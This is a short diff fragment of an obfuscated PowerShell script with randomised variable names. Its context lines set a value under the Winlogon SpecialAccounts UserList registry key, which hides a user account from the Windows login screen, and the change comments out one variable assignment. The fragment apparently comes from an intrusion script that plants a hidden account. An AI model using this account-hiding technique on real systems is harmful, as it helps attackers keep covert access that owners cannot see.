@@ -32,7 +32,7 @@ New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Spec
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $NzSqmkZnFQcBf -Value 0 -Type DWORD -Force
 
 # Variables
-$EubGKxeoVHdWnNIr = mfRCoqywZDeQlL(5)
+# $EubGKxeoVHdWnNIr = mfRCoqywZDeQlL(5)
 # $rkeuRmdqpyEPQG = "$env:TEMP\$EubGKxeoVHdWnNIr"
 # save current directory
 $fXmtFxsAMdGw = Get-Location|%{$_.Path}
